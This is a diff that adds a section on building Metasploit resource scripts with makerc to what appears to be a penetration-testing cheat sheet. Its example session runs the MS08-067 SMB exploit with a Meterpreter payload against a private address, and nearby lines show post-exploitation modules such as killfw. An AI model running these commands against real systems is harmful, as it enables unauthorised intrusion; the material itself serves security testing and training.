@@ -678,6 +678,25 @@ run post/windows/manage/migrate
 run post/windows/manage/killfw
 run post/windows/gather/checkvm
 ```
+
+## Metasploit Resource Script Creation:
+
+Although there are several resource scripts that are available through the framework, you may want to build a custom script of your own. For example, if you routinely run a specific exploit and payload combination against a target, you may want to create a resource script to automate these commands for you. Since this example uses purely ```msfconsole``` commands, the easiest way to create a resource script is through the ```makerc``` command available in ```msfconsole```. The ```makerc``` command records all of the commands you've run in the console and saves them in a resource script for you.
+
+```
+msf > workspace demo
+msf > use exploit/windows/smb/ms08_067_netapi
+msf (ms08_067_netapi) > set RHOST 192.168.1.1
+msf (ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
+msf (ms08_067_netapi) > exploit
+```
+
+To save these commands to a resource script, we can use the ```makerc``` command. We'll need to provide the output location and name we want the script to use:
+
+```
+msf (ms08_067_netapi) > makerc ~/Desktop/myscript.rc
+```
+
 ## Metasploit Session Management:
 
 List all sessions
